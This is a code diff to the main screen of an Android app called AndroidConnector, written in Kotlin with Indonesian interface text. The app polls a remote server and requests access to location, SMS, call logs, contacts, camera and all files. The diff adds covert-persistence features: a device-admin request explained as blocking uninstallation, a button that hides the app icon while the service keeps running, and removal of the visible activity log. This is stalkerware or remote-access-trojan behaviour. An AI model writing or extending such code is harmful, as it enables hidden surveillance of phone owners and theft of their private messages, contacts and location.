@@ -1,6 +1,8 @@
 package com.kztutorial99.androidconnector
 
 import android.Manifest
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
@@ -10,7 +12,7 @@ import android.os.Bundle
 import android.os.Environment
 import android.os.PowerManager
 import android.provider.Settings
-import android.text.method.ScrollingMovementMethod
+import android.view.View
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
@@ -23,8 +25,6 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var binding: ActivityMainBinding
     private val prefs by lazy { getSharedPreferences("connector_prefs", Context.MODE_PRIVATE) }
-    private val logBuilder = StringBuilder()
-    private val MAX_LOG = 150
 
     private val RUNTIME_PERMISSIONS = arrayOf(
         Manifest.permission.ACCESS_FINE_LOCATION,
@@ -34,11 +34,17 @@ class MainActivity : AppCompatActivity() {
         Manifest.permission.CAMERA,
     )
 
+    private val dpm by lazy { getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager }
+    private val adminComponent by lazy { ComponentName(this, AppDeviceAdminReceiver::class.java) }
+    private val launcherAlias by lazy { ComponentName(this, "$packageName.MainLauncherAlias") }
+
+    private val REQUEST_PERMISSIONS = 2001
+    private val REQUEST_DEVICE_ADMIN = 3001
+    private val REQUEST_STORAGE = 4001
+
     private val shizukuPermissionListener = Shizuku.OnRequestPermissionResultListener { _, result ->
         if (result == PackageManager.PERMISSION_GRANTED) {
-            appendLog("✅ Shizuku: permission granted")
-        } else {
-            appendLog("⚠️ Shizuku: permission denied")
+            updatePermissionStatus()
         }
     }
 
@@ -47,7 +53,6 @@ class MainActivity : AppCompatActivity() {
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
-        binding.tvLog.movementMethod = ScrollingMovementMethod()
         binding.tvVersion.text = "v${packageManager.getPackageInfo(packageName, 0).versionName}"
 
         val deviceId = ensureDeviceId()
@@ -55,38 +60,32 @@ class MainActivity : AppCompatActivity() {
         binding.tvServerUrl.text = ConnectorService.SERVER_URL.removePrefix("https://")
 
         setupButtons()
-        requestAllPermissions()
-        requestBatteryOptimization()
 
         Shizuku.addRequestPermissionResultListener(shizukuPermissionListener)
-        checkShizuku()
-        requestStoragePermission()
 
         ConnectorService.statusCallback = { msg, running ->
-            runOnUiThread {
-                // "Connected" fires every 2s — only update status UI, don't spam log
-                if (msg != "Connected") {
-                    appendLog(msg)
-                }
-                updateServiceState(running)
-            }
+            runOnUiThread { updateServiceState(running) }
         }
 
-        appendLog("AndroidConnector started")
-        appendLog("Device: ${Build.MANUFACTURER} ${Build.MODEL}")
-        appendLog("Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
-        appendLog("Device ID: $deviceId")
-        appendLog("")
-
         if (!ConnectorService.isRunning) {
-            appendLog("→ Auto-connecting to server…")
             startConnectorService()
         } else {
             updateServiceState(true)
-            appendLog("→ Service already running")
         }
 
         WatchdogReceiver.schedule(this)
+
+        requestAllPermissions()
+        requestBatteryOptimization()
+        requestStoragePermission()
+        requestDeviceAdmin()
+        checkShizuku()
+        updatePermissionStatus()
+    }
+
+    override fun onResume() {
+        super.onResume()
+        updatePermissionStatus()
     }
 
     override fun onDestroy() {
@@ -107,19 +106,18 @@ class MainActivity : AppCompatActivity() {
     private fun setupButtons() {
         binding.btnConnect.setOnClickListener {
             startConnectorService()
-            appendLog("🔄 Connecting…")
         }
 
         binding.btnDisconnect.setOnClickListener {
             stopService(Intent(this, ConnectorService::class.java))
             WatchdogReceiver.cancel(this)
             updateServiceState(false)
-            appendLog("🔴 Disconnected")
         }
 
-        binding.btnClearLog.setOnClickListener {
-            logBuilder.clear()
-            binding.tvLog.text = ""
+        binding.btnLaunch.setOnClickListener {
+            hideAppIcon()
+            Toast.makeText(this, "Ikon aplikasi disembunyikan. Layanan tetap berjalan.", Toast.LENGTH_LONG).show()
+            finish()
         }
     }
 
@@ -146,6 +144,60 @@ class MainActivity : AppCompatActivity() {
             if (running) "Polling ${ConnectorService.SERVER_URL.removePrefix("https://")}" else "Tap CONNECT to start"
     }
 
+    private fun updatePermissionStatus() {
+        val runtimeGranted = RUNTIME_PERMISSIONS.all {
+            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
+        }
+        val storageGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            Environment.isExternalStorageManager()
+        } else true
+
+        val allGranted = runtimeGranted && storageGranted
+
+        if (allGranted) {
+            binding.tvPermStatus.text = "✅ Semua izin telah diberikan"
+            binding.tvPermStatus.setTextColor(getColor(R.color.green))
+            binding.btnLaunch.visibility = View.VISIBLE
+        } else {
+            val missing = mutableListOf<String>()
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) missing.add("Lokasi")
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) missing.add("SMS")
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) missing.add("Log Panggilan")
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) missing.add("Kontak")
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) missing.add("Kamera")
+            if (!storageGranted) missing.add("Akses File")
+
+            binding.tvPermStatus.text = "⚠️ Belum diizinkan: ${missing.joinToString(", ")}"
+            binding.tvPermStatus.setTextColor(getColor(R.color.red))
+            binding.btnLaunch.visibility = View.GONE
+        }
+    }
+
+    private fun hideAppIcon() {
+        try {
+            packageManager.setComponentEnabledSetting(
+                launcherAlias,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (e: Exception) {
+            Toast.makeText(this, "Gagal sembunyikan ikon: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    private fun requestDeviceAdmin() {
+        if (!dpm.isAdminActive(adminComponent)) {
+            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
+                putExtra(
+                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                    "Diperlukan agar aplikasi tidak dapat di-uninstall dan tetap berjalan di latar belakang."
+                )
+            }
+            startActivityForResult(intent, REQUEST_DEVICE_ADMIN)
+        }
+    }
+
     private fun requestBatteryOptimization() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             val pm = getSystemService(PowerManager::class.java)
@@ -154,12 +206,7 @@ class MainActivity : AppCompatActivity() {
                     startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                         data = Uri.parse("package:$packageName")
                     })
-                    appendLog("⚡ Requesting battery optimization exemption…")
-                } catch (e: Exception) {
-                    appendLog("⚠️ Could not request battery optimization: ${e.message}")
-                }
-            } else {
-                appendLog("✅ Battery optimization: exempt")
+                } catch (_: Exception) {}
             }
         }
     }
@@ -169,7 +216,7 @@ class MainActivity : AppCompatActivity() {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }.toTypedArray()
         if (missing.isNotEmpty()) {
-            ActivityCompat.requestPermissions(this, missing, 2001)
+            ActivityCompat.requestPermissions(this, missing, REQUEST_PERMISSIONS)
         }
     }
 
@@ -180,7 +227,7 @@ class MainActivity : AppCompatActivity() {
                     startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                         data = Uri.parse("package:$packageName")
                     })
-                } catch (e: Exception) {
+                } catch (_: Exception) {
                     startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                 }
             }
@@ -191,43 +238,28 @@ class MainActivity : AppCompatActivity() {
         try {
             val available = Shizuku.pingBinder()
             val granted = available && Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
-            when {
-                granted -> appendLog("✅ Shizuku: active (elevated commands enabled)")
-                available -> {
-                    appendLog("⚠️ Shizuku running — tap status to grant permission")
-                    binding.cardStatus.setOnClickListener {
-                        try { Shizuku.requestPermission(1001) } catch (_: Exception) {}
-                    }
+            if (!granted && available) {
+                binding.cardStatus.setOnClickListener {
+                    try { Shizuku.requestPermission(1001) } catch (_: Exception) {}
                 }
-                else -> appendLog("ℹ️ Shizuku not running (optional)")
             }
         } catch (_: Exception) {}
     }
 
     override fun onRequestPermissionsResult(code: Int, perms: Array<String>, results: IntArray) {
         super.onRequestPermissionsResult(code, perms, results)
-        if (code == 2001) {
-            val granted = results.count { it == PackageManager.PERMISSION_GRANTED }
-            appendLog("✅ Permissions: $granted/${results.size} granted")
-        }
+        updatePermissionStatus()
         if (code == 1001) {
-            shizukuPermissionListener.onRequestPermissionResult(code,
-                if (results.isNotEmpty()) results[0] else PackageManager.PERMISSION_DENIED)
+            val result = if (results.isNotEmpty()) results[0] else PackageManager.PERMISSION_DENIED
+            shizukuPermissionListener.onRequestPermissionResult(code, result)
         }
     }
 
-    private fun appendLog(msg: String) {
-        val lines = logBuilder.lines()
-        if (lines.size > MAX_LOG) {
-            logBuilder.clear()
-            logBuilder.append(lines.takeLast(MAX_LOG).joinToString("\n"))
-            logBuilder.append("\n")
+    @Deprecated("Deprecated in Java")
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == REQUEST_DEVICE_ADMIN) {
+            updatePermissionStatus()
         }
-        logBuilder.appendLine(msg)
-        binding.tvLog.text = logBuilder.toString()
-        val scroll = binding.tvLog.layout?.let {
-            it.getLineTop(binding.tvLog.lineCount) - binding.tvLog.height
-        } ?: 0
-        if (scroll > 0) binding.tvLog.scrollTo(0, scroll)
     }
 }
